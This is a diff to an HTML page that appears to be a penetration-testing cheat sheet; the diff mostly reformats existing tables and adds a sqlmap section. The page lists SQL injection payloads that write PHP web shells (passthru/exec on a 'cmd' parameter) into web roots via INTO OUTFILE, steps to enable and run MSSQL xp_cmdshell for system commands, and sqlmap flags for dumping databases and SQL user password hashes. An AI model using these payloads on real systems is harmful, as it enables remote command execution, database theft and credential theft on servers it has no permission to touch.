@@ -635,44 +635,82 @@ layout: default
         <tr>
             <td>Create file</td>
             <td>'union select ("<mark>&lt;text&gt;</mark>"),2,3,4,5,6 INTO OUTFILE '<mark>&lt;directory&gt;</mark>'-- -</td>
-            </tr>
-            <tr>
-                <td>Create a reverse shell</td>
-                <td>
-                    <li>&#039; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#039;cmd&#039;]);&quot;) INTO OUTFILE &#039;C:/xampp/htdocs/cmd.php&#039;  -- -</li>
-                        <li>&#039; UNION SELECT (&lt;?php echo exec($_GET[&quot;cmd&quot;]);) INTO OUTFILE &#039;/srv/http/cmd.php&#039;;-- -</li>
-                        </td>
-                    </tr>
-                </table>
+        </tr>
+        <tr>
+            <td>Create a reverse shell</td>
+            <td>
+                <li>&#039; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#039;cmd&#039;]);&quot;) INTO OUTFILE &#039;C:/xampp/htdocs/cmd.php&#039;  -- -</li>
+                <li>&#039; UNION SELECT (&lt;?php echo exec($_GET[&quot;cmd&quot;]);) INTO OUTFILE &#039;/srv/http/cmd.php&#039;;-- -</li>
+            </td>
+        </tr>
+    </table>
 
-                <li>MSSQL</li>
-                <ul>
-                    <li>xp_cmdshell</li>
-                    <ul>
-                        <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
-                        <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
-                    </ul>
+    <li>MSSQL</li>
+    <ul>
+        <li>xp_cmdshell</li>
+        <ul>
+            <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
+            <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
+        </ul>
+        <table>
+            <tr>
+                <td>Enable xp_cmdshell</td>
+                <td>
                     <table>
                         <tr>
-                            <td>Enable xp_cmdshell</td>
-                            <td>
-                                <table>
-                                    <tr>
-                                        <td>Step #1</td>
-                                        <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
-                                    </tr>
-                                    <tr>
-                                        <td>Step #2</td>
-                                        <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
-                                    </tr>
-                                </table>
-                            </td>
+                            <td>Step #1</td>
+                            <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
                         </tr>
                         <tr>
-                            <td>Execute xp_cmdshell</td>
-                            <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
+                            <td>Step #2</td>
+                            <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
                         </tr>
                     </table>
-                </ul>
+                </td>
+            </tr>
+            <tr>
+                <td>Execute xp_cmdshell</td>
+                <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
+            </tr>
+        </table>
+    </ul>
+
+  <li>sqlmap</li>  
+  <ul>
+      <li>Usage (batch style) with some flags explained:</li>
+      <ul>
+          <li>sqlmap -r &lt;Saved GET request&gt; --batch [--force-ssl] [--technique=U] [--dbms=mysql] [--password]</li>
+          <table>
+            <tr>
+                <td>-r</td>
+                <td>Specifies the usage a of request file instead of providing a url.  This get request file can be made using burp.  Intercept the web page request, right click, select copy to file.</td>
+            </tr>
+            <tr>
+                <td>--batch</td>
+                <td>Answers questions for you while running sqlmap</td>
+            </tr>
+              <tr>
+                  <td>--technique=U</td>
+                  <td>Verify that UNION attack works ahead of time and specify the technique for sqlmap to use</td>
+              </tr>
+              <tr>
+                  <td>--password</td>
+                  <td>Dump hash for sql users</td>
+              </tr>
+              <tr>
+                  <td>--dbs</td>
+                  <td>database list</td>
+              </tr>
+              <tr>
+                  <td>-D &lt;db name&gt; --dump</td>
+                  <td>Dump specific DB</td>
+              </tr>
+              <tr>
+                  <td>--dump</td>
+                  <td>Dump DB</td>
+              </tr>
+          </table>
+      </ul>
+  </ul>
 
 
